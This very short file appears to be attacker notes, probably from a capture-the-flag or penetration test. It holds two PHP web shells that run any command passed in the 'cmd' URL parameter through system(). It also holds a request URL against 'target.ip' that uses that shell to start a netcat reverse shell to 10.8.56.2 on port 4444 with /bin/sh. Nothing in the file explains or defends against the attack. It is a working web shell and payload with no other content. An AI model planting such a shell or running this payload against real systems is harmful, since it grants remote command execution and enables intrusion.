
<?php 
    if(isset($_GET['cmd'])) { 
        system($_GET['cmd']); 
    }
?>


<?php system($_GET['cmd']);?>

http://target.ip/redis.php?cmd=nc%2010.8.56.2%204444%20-e%20/bin/sh